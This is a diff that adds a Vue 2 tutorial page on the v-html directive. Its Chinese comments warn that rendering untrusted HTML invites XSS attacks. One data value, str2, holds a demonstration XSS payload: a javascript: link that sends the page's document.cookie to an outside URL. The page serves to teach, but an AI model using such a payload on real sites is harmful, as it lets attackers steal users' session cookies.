@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>v-text</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <!-- 
+        v-html指令：
+            1.作用：向指定节点中渲染包含html结构得内容
+            2.与插值语法的区别：
+                1.v-html会替换掉节点中所有的内容，{{xx}}不会替换
+                2.v-html可以识别html标签
+            3.严重注意: v-html有安全性问题
+                1.在网站上动态渲染任意html是非常危险的，容易导致xss攻击
+                2.一定要在可信的内容上使用v-html,永远不要在用户提交的内容上使用
+     -->
+    <div id="root">
+        <div>{{name}}</div>
+        <!-- 支持标签解析 -->
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+        new Vue({
+             el: "#root",
+             data:{
+                name: "百度",
+                str:"<h1>你好啊</h1>",
+                str2:"<a href=javascript:location.href='https://www.baidu.com?'+document.cookie>找到的资源</a>"
+             }
+        })
+    </script>
+</body>
+</html>
